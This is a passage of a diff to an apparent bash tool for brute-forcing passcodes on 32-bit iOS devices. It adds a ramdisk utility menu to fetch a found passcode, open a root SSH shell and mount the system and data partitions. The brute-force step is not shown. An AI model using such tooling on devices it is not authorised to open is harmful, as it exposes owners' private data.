+        error "Could not find any passcode results on the device."
+    fi
+    kill $iproxy_pid 2>/dev/null
+}
+
+mount_partitions() {
+    device_iproxy
+    log "Mounting partitions..."
+    $ssh2 -p $ssh_port root@127.0.0.1 "mount.sh root" 2>/dev/null
+    $ssh2 -p $ssh_port root@127.0.0.1 "mount.sh" 2>/dev/null
+    log "Partitions mounted. Access them at /mnt1 (System) and /mnt2 (Data)."
+    kill $iproxy_pid 2>/dev/null
 }
 
 
@@ -820,7 +1019,7 @@ main() {
     echo "::"
     echo "::    Bruteforce Passcode 32bit IOS Device"
     echo "::"
-    echo "::    BUILD_TAG: 1.0"
+    echo "::    BUILD_TAG: 2.0.0"
     echo "::"
     echo "::    BUILD_SYTLE: RELEASE"
     echo "::"
@@ -829,20 +1028,45 @@ main() {
     echo "======================================"
     echo
     [[ $EUID == 0 ]] && error "Do not run as root."
-    [[ ! -d "../resources" ]] && error "Resources folder not found."
+    # Resources check moved to init section for reliability
     set_tool_paths
     device_get_info
     
-    # 1. Create SSHRD
+    # 1. Create and Boot SSHRD
     create_sshrd
-    
-    # 2. Boot SSHRD
     boot_sshrd
+    # 2. Skip Utility Menu for iOS 6+
+    local major_ver="${device_target_build:0:2}"
+    if [[ "$major_ver" =~ ^[0-9]+$ ]] && [[ $major_ver -ge 10 ]]; then
+        log "Ramdisk boot sequence complete for iOS 6+ ($device_target_build). Exiting."
+        exit
+    fi
+    
+    # 2. Ramdisk Menu (Utility Menu) - For iOS 5 and below
+    while true; do
+        echo
+        echo "================ UTILITY MENU ================"
+        echo "1. Fetch Found Passcode (via SSH)"
+        echo "2. SSH Terminal (root@127.0.0.1)"
+        echo "3. Mount Partitions"
+        echo "4. Reboot Device"
+        echo "q. Exit"
+        echo "=============================================="
+        read -p "$(input 'Select an option: ')" opt
+        case $opt in
+            1) fetch_passcode;;
+            2) device_ssh;;
+            3) mount_partitions;;
+            4) $irecovery -c "reboot"; exit;;
+            q) exit;;
+            *) echo "Invalid option.";;
+        esac
+    done
 }
 
 # ==================== INIT ====================
 
-color_R=$(tput setaf 1); color_G=$(tput setaf 2); color_Y=$(tput setaf 3); color_N=$(tput sgr0)
+color_R=$(tput setaf 1); color_G=$(tput setaf 2); color_Y=$(tput setaf 208); color_N=$(tput sgr0)
 
 for arg in "$@"; do
     case $arg in
@@ -853,6 +1077,7 @@ for arg in "$@"; do
     esac
 done
 
-mkdir -p "tmp$$"; cd "tmp$$" || exit 1
+[[ ! -d "$PROJECT_ROOT/resources" ]] && { echo "[Error] Resources folder not found in $PROJECT_ROOT"; exit 1; }
+mkdir -p "$PROJECT_ROOT/tmp$$"; cd "$PROJECT_ROOT/tmp$$" || exit 1
 main
 tput sgr0
